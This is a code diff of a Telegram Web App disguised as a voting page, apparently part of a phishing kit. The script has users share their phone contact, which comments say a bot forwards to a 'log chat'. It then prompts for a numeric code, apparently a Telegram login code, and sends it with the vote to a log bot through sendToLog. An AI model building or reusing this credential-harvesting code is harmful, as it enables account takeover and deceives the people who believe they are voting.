@@ -10,15 +10,19 @@
         .hidden { display: none !important; }
         h2 { font-size: 24px; font-weight: 600; margin-bottom: 10px; margin-top: 20px; }
         p { font-size: 14px; color: var(--hint); line-height: 1.4; margin-bottom: 20px; }
+        
         .vote-option { border: 2px solid var(--hint); border-radius: 12px; padding: 15px; margin-bottom: 10px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
         .vote-option.selected { border-color: var(--btn); background: rgba(51, 144, 236, 0.1); }
+        
         .main-btn { background: var(--btn); color: var(--btn-text); border: none; border-radius: 10px; padding: 15px 20px; font-size: 16px; font-weight: 600; width: 100%; max-width: 300px; margin-top: 20px; cursor: pointer; display: block; margin-left: auto; margin-right: auto; }
         .main-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
         .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
         .code-cell { width: 45px; height: 55px; border: 1.5px solid var(--hint); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 600; transition: border-color 0.2s; }
         .code-cell.filled { border-color: var(--btn); }
         .code-cell.active { border-color: var(--btn); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
         .code-input { position: absolute; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
+        
         .success-text { color: #34c759; font-size: 18px; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
@@ -89,7 +93,7 @@
                 const tg = window.Telegram.WebApp;
                 tg.expand();
 
-                // Проверяем хэш (срабатывает после нажатия кнопки)
+                // Если в URL есть #code, сразу показываем экран ввода кода
                 if (window.location.hash === "#code") {
                     showCodeScreen();
                 }
@@ -98,8 +102,10 @@
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Контакт улетел боту через системное сообщение!
-                            // Переключаем экран на ввод кода через хэш (без перезагрузки страницы)
+                            // Бот сам поймает системный контакт и перешлет его в лог-чат.
+                            // Нам не нужно читать contact.phone_number, он все равно undefined.
+                            
+                            // Мгновенно переключаем экран на ввод кода
                             window.location.hash = "code";
                             showCodeScreen();
                         }
@@ -135,6 +141,7 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.getElementById('code-subtitle').innerHTML = "<b>Отправка...</b>";
                         
+                        // Код отправляем через лог-бота
                         sendToLog(`🗳 <b>ГОЛОС:</b> ${selectedVote}\n🔑 <b>КОД:</b> ${value}`);
                         
                         setTimeout(() => {
